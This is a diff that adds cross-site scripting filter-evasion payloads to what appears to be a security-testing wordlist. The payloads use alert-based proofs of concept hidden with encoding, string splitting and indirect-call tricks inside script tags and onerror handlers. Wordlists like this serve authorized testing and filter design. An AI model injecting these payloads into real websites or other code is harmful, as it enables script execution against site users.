@@ -40,3 +40,32 @@ element[attribute='<img src=x onerror=alert('XSS');>
 <scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>
 <sCR<script>iPt>alert(1)</SCr</script>IPt>
 <script>for((i)in(self))eval(i)(1)</script>
+(alert)(1)
+<SCRIPT>(alert)(1)</SCRIPT>
+<img src=x onerror="(alert)(1)">
+a=alert,a(1)
+<SCRIPT>a=alert,a(1)</SCRIPT>
+<img src=x onerror=a=alert,a(1) >
+[1].find(alert)
+<script>[1].find(alert)</script>
+<img src=x onerror=[1].find(alert)>
+alert&lpar;1&rpar;
+<img src=x onerror=alert&lpar;1&rpar;>
+alert`1`
+<img src=x onerror=alert`1`>
+alert&#x28;1&#x29
+<img src=x onerror=alert&#x28;1&#x29>
+alert&#40;1&#41
+<img src=x onerror=alert&#40;1&#41>
+top["al"+"ert"](1)
+<img src=x onerror=top["al"+"ert"](1)>
+<script>top["al"+"ert"](1)</script>
+top[/al/.source+/ert/.source](1)
+<script>top[/al/.source+/ert/.source](1)</script>
+<img src=x onerror=top[/al/.source+/ert/.source](1)>
+top['al\145rt'](1)
+<img src=x onerror=top['al\145rt'](1)>
+<script>top['al\145rt'](1)</script>
+top[8680439..toString(30)](1)
+<script>top[8680439..toString(30)](1)</script>
+<img src=x onerror=top[8680439..toString(30)](1)>
